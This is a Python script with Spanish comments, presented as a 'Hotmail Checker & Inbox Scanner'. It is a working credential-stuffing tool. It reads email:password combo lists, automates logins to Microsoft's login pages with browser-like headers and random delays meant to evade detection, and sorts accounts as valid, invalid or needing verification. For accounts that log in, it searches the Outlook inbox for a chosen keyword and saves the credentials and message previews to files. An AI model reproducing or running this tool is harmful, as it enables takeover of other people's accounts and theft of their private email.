#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Hotmail Checker & Inbox Scanner
Basado en el script original de @PROO_IS_BACK
"""

import requests
import re
import urllib.parse
from typing import Dict, Optional, Tuple
import json
import time
import random
from colorama import Fore, Style, init

# Inicializar colorama
init(autoreset=True)

class HotmailChecker:
    def __init__(self):
        self.session = None
        self.reset_session()
    
    def reset_session(self):
        """Reinicia la sesión con headers realistas"""
        self.session = requests.Session()
        
        # Headers más realistas basados en el .opk
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0'
        })
    
    def parse_between(self, text: str, left: str, right: str) -> Optional[str]:
        """Extrae texto entre dos delimitadores"""
        try:
            start = text.find(left)
            if start == -1:
                return None
            start += len(left)
            end = text.find(right, start)
            if end == -1:
                return None
            return text[start:end]
        except:
            return None
    
    def check_account(self, email: str, password: str, keyword: str = "") -> Tuple[str, Dict]:
        """
        Verifica una cuenta de Hotmail y busca palabra clave en el inbox
        Retorna: (status, data)
        status: 'VALID', 'INVALID', 'ERROR', 'HIT'
        """
        try:
            # Resetear sesión para cada cuenta
            self.reset_session()
            
            # Delay aleatorio para evitar detección
            time.sleep(random.uniform(1, 3))
            
            # Paso 1: Obtener página inicial de login.live.com (más directo)
            initial_url = f"https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015"
            
            response = self.session.get(initial_url, timeout=30)
            
            if response.status_code != 200:
                return 'ERROR', {'message': 'No se pudo acceder a la página de login'}
            
            # Extraer tokens de la página de login
            # Buscar PPFT
            ppft_match = re.search(r'name="PPFT"[^>]*value="([^"]+)"', response.text)
            if not ppft_match:
                ppft_match = re.search(r'"sFTTag":".*?value=\\"([^"]+)\\"', response.text)
            
            if not ppft_match:
                return 'ERROR', {'message': 'No se pudo extraer token PPFT'}
            
            ppft = ppft_match.group(1)
            
            # Extraer URL de POST
            post_url_match = re.search(r'"urlPost":"([^"]+)"', response.text)
            if not post_url_match:
                post_url_match = re.search(r'urlPost:\'([^\']+)\'', response.text)
            
            if not post_url_match:
                # URL por defecto
                post_url = "https://login.live.com/ppsecure/post.srf"
            else:
                post_url = post_url_match.group(1).replace('\\u0026', '&')
            
            # Paso 2: Enviar credenciales
            login_data = {
                'i13': '0',
                'login': email,
                'loginfmt': email,
                'type': '11',
                'LoginOptions': '3',
                'lrt': '',
                'lrtPartition': '',
                'hisRegion': '',
                'hisScaleUnit': '',
                'passwd': password,
                'ps': '2',
                'psRNGCDefaultType': '',
                'psRNGCEntropy': '',
                'psRNGCSLK': '',
                'canary': '',
                'ctx': '',
                'hpgrequestid': '',
                'PPFT': ppft,
                'PPSX': 'PassportR',
                'NewUser': '1',
                'FoundMSAs': '',
                'fspost': '0',
                'i21': '0',
                'CookieDisclosure': '0',
                'IsFidoSupported': '1',
                'isSignupPost': '0',
                'isRecoveryAttemptPost': '0',
                'i19': '12345'
            }
            
            # Headers para el POST de login
            login_headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://login.live.com',
                'Referer': initial_url,
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Dest': 'document'
            }
            
            auth_response = self.session.post(
                post_url, 
                data=login_data, 
                headers=login_headers,
                allow_redirects=True,
                timeout=30
            )
            
            # Verificar resultado del login
            response_text = auth_response.text.lower()
            
            # Detectar errores de credenciales
            if any(error in response_text for error in [
                'your account or password is incorrect',
                'that microsoft account doesn',
                'sign in to your microsoft account',
                'javascript required to sign in',
                'incorrect password',
                'password is incorrect',
                'that account doesn'
            ]):
                return 'INVALID', {'message': 'Credenciales incorrectas'}
            
            # Detectar si requiere verificación adicional
            if any(verify in response_text for verify in [
                'verify your identity',
                'verify it',
                'security code',
                'account.live.com/recover',
                'account.live.com/identity/confirm'
            ]):
                return 'CUSTOM', {'message': 'Requiere verificación adicional'}
            
            # Verificar cookies de autenticación exitosa
            cookies_str = str(self.session.cookies.get_dict())
            
            if any(cookie in cookies_str for cookie in ['MSAAUTH', 'MSPAuth', 'WLSSC']):
                # Login exitoso
                result = {
                    'email': email,
                    'password': password,
                    'message': 'Cuenta válida'
                }
                
                # Si hay keyword, buscar en inbox
                if keyword:
                    time.sleep(random.uniform(2, 4))
                    inbox_result = self.search_inbox(email, keyword)
                    if inbox_result.get('found'):
                        result['inbox_count'] = inbox_result['count']
                        result['previews'] = inbox_result['previews']
                        return 'HIT', result
                
                return 'VALID', result
            
            # Si llegamos aquí, verificar si hay redirección a Outlook
            if 'outlook.live.com' in auth_response.url or 'outlook.office365.com' in auth_response.url:
                result = {
                    'email': email,
                    'password': password,
                    'message': 'Cuenta válida'
                }
                
                if keyword:
                    time.sleep(random.uniform(2, 4))
                    inbox_result = self.search_inbox(email, keyword)
                    if inbox_result.get('found'):
                        result['inbox_count'] = inbox_result['count']
                        result['previews'] = inbox_result['previews']
                        return 'HIT', result
                
                return 'VALID', result
            
            # Si no hay cookies ni redirección, es inválida
            return 'INVALID', {'message': 'Login fallido'}
            
        except requests.exceptions.Timeout:
            return 'ERROR', {'message': 'Timeout'}
        except requests.exceptions.RequestException as e:
            return 'ERROR', {'message': f'Error de red: {str(e)[:50]}'}
        except Exception as e:
            return 'ERROR', {'message': f'Error: {str(e)[:50]}'}
    
    def search_inbox(self, email: str, keyword: str) -> Dict:
        """Busca una palabra clave en el inbox de la cuenta"""
        try:
            # Primero ir a la página principal de Outlook para establecer sesión
            outlook_url = "https://outlook.live.com/mail/"
            self.session.get(outlook_url, timeout=30)
            
            time.sleep(random.uniform(1, 2))
            
            # Intentar obtener access token
            # Buscar en las cookies
            anchor_mailbox = None
            for cookie in self.session.cookies:
                if 'mailbox' in cookie.name.lower() or 'anchor' in cookie.name.lower():
                    anchor_mailbox = cookie.value
                    break
            
            if not anchor_mailbox:
                # Intentar método alternativo: buscar en la página
                return {'found': False, 'count': 0, 'previews': []}
            
            # Construir request de búsqueda
            search_url = "https://outlook.live.com/search/api/v2/query"
            
            search_payload = {
                "Cvid": f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}",
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {
                        "Or": [
                            {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                            {"Term": {"DistinguishedFolderName": "inbox"}}
                        ]
                    },
                    "From": 0,
                    "Query": {"QueryString": keyword},
                    "Size": 25,
                    "Sort": [
                        {"Field": "Time", "SortDirection": "Desc"}
                    ],
                    "EnableTopResults": True,
                    "TopResultsCount": 3
                }],
                "QueryAlterationOptions": {
                    "EnableSuggestion": True,
                    "EnableAlteration": True
                }
            }
            
            search_headers = {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'X-OWA-CANARY': 'canary',
                'Origin': 'https://outlook.live.com',
                'Referer': 'https://outlook.live.com/mail/'
            }
            
            search_response = self.session.post(
                search_url, 
                json=search_payload, 
                headers=search_headers, 
                timeout=30
            )
            
            # Parsear resultados
            if search_response.status_code == 200:
                # Buscar total de resultados
                total_match = re.search(r'"Total["\s:]+(\d+)', search_response.text)
                if total_match:
                    total_count = int(total_match.group(1))
                    if total_count > 0:
                        # Extraer previews
                        previews = re.findall(r'"Preview":"([^"]+)"', search_response.text)
                        return {
                            'found': True,
                            'count': total_count,
                            'previews': previews[:3]
                        }
            
            return {'found': False, 'count': 0, 'previews': []}
            
        except Exception as e:
            return {'found': False, 'count': 0, 'previews': [], 'error': str(e)[:50]}


def print_banner():
    """Imprime el banner de la herramienta"""
    banner = f"""
{Fore.CYAN}╔═══════════════════════════════════════════════════════╗
║         HOTMAIL CHECKER & INBOX SCANNER v2.0          ║
║              Basado en script de @PROO_IS_BACK        ║
╚═══════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
    print(banner)


def load_combo_file(filename: str):
    """Carga el archivo de combos (email:password)"""
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        return lines
    except FileNotFoundError:
        print(f"{Fore.RED}[ERROR] Archivo no encontrado: {filename}{Style.RESET_ALL}")
        return []
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Error al leer archivo: {e}{Style.RESET_ALL}")
        return []


def save_result(filename: str, status: str, email: str, password: str, data: Dict):
    """Guarda los resultados en archivos"""
    try:
        with open(filename, 'a', encoding='utf-8') as f:
            if status == 'HIT':
                f.write(f"{email}:{password} | Hits: {data.get('inbox_count', 0)}\n")
                if data.get('previews'):
                    for preview in data['previews'][:2]:
                        f.write(f"  → {preview[:100]}\n")
            elif status == 'VALID':
                f.write(f"{email}:{password}\n")
            elif status == 'CUSTOM':
                f.write(f"{email}:{password} | {data.get('message', '')}\n")
    except Exception as e:
        print(f"{Fore.RED}[ERROR] No se pudo guardar resultado: {e}{Style.RESET_ALL}")


def main():
    print_banner()
    
    # Solicitar archivo de combos
    combo_file = input(f"{Fore.YELLOW}[?] Ingresa el nombre del archivo de combos (ej: combos.txt): {Style.RESET_ALL}").strip()
    
    if not combo_file:
        print(f"{Fore.RED}[ERROR] Debes ingresar un archivo de combos{Style.RESET_ALL}")
        return
    
    # Solicitar palabra clave (opcional)
    keyword = input(f"{Fore.YELLOW}[?] Ingresa palabra clave para buscar en inbox (Enter para omitir): {Style.RESET_ALL}").strip()
    
    # Cargar combos
    combos = load_combo_file(combo_file)
    
    if not combos:
        print(f"{Fore.RED}[ERROR] No se pudieron cargar combos del archivo{Style.RESET_ALL}")
        return
    
    print(f"\n{Fore.CYAN}[INFO] Cargados {len(combos)} combos{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[INFO] Iniciando verificación...{Style.RESET_ALL}\n")
    
    # Contadores
    stats = {
        'valid': 0,
        'invalid': 0,
        'hits': 0,
        'errors': 0,
        'custom': 0
    }
    
    checker = HotmailChecker()
    
    for i, combo in enumerate(combos, 1):
        try:
            # Parsear combo
            if ':' not in combo:
                print(f"{Fore.RED}[{i}/{len(combos)}] Formato inválido: {combo}{Style.RESET_ALL}")
                continue
            
            parts = combo.split(':', 1)
            if len(parts) != 2:
                continue
                
            email, password = parts[0].strip(), parts[1].strip()
            
            if not email or not password:
                continue
            
            print(f"{Fore.CYAN}[{i}/{len(combos)}] Verificando: {email}{Style.RESET_ALL}", end=' ')
            
            # Verificar cuenta
            status, data = checker.check_account(email, password, keyword)
            
            if status == 'VALID':
                stats['valid'] += 1
                print(f"{Fore.GREEN}✓ VÁLIDA{Style.RESET_ALL}")
                save_result('valid.txt', status, email, password, data)
            
            elif status == 'HIT':
                stats['hits'] += 1
                print(f"{Fore.MAGENTA}★ HIT! ({data.get('inbox_count', 0)} resultados){Style.RESET_ALL}")
                save_result('hits.txt', status, email, password, data)
                save_result('valid.txt', status, email, password, data)
            
            elif status == 'INVALID':
                stats['invalid'] += 1
                print(f"{Fore.RED}✗ INVÁLIDA{Style.RESET_ALL}")
            
            elif status == 'CUSTOM':
                stats['custom'] += 1
                print(f"{Fore.YELLOW}◆ REQUIERE VERIFICACIÓN{Style.RESET_ALL}")
                save_result('custom.txt', status, email, password, data)
            
            else:  # ERROR
                stats['errors'] += 1
                print(f"{Fore.YELLOW}⚠ ERROR: {data.get('message', 'Desconocido')}{Style.RESET_ALL}")
        
        except KeyboardInterrupt:
            print(f"\n\n{Fore.YELLOW}[!] Detenido por el usuario{Style.RESET_ALL}")
            break
        except Exception as e:
            print(f"{Fore.RED}[ERROR] {str(e)[:50]}{Style.RESET_ALL}")
            stats['errors'] += 1
    
    # Mostrar estadísticas finales
    print(f"\n{Fore.CYAN}╔═══════════════════════════════════════════════════════╗")
    print(f"║                  RESULTADOS FINALES                   ║")
    print(f"╠═══════════════════════════════════════════════════════╣")
    print(f"║  {Fore.GREEN}Válidas: {stats['valid']:<44}{Fore.CYAN}║")
    print(f"║  {Fore.MAGENTA}Hits: {stats['hits']:<47}{Fore.CYAN}║")
    print(f"║  {Fore.YELLOW}Requieren verificación: {stats['custom']:<29}{Fore.CYAN}║")
    print(f"║  {Fore.RED}Inválidas: {stats['invalid']:<42}{Fore.CYAN}║")
    print(f"║  {Fore.YELLOW}Errores: {stats['errors']:<44}{Fore.CYAN}║")
    print(f"╚═══════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
    
    if stats['valid'] > 0:
        print(f"{Fore.GREEN}[✓] Cuentas válidas guardadas en: valid.txt{Style.RESET_ALL}")
    if stats['hits'] > 0:
        print(f"{Fore.MAGENTA}[★] Hits guardados en: hits.txt{Style.RESET_ALL}")
    if stats['custom'] > 0:
        print(f"{Fore.YELLOW}[◆] Cuentas con verificación en: custom.txt{Style.RESET_ALL}")


if __name__ == '__main__':
    main()
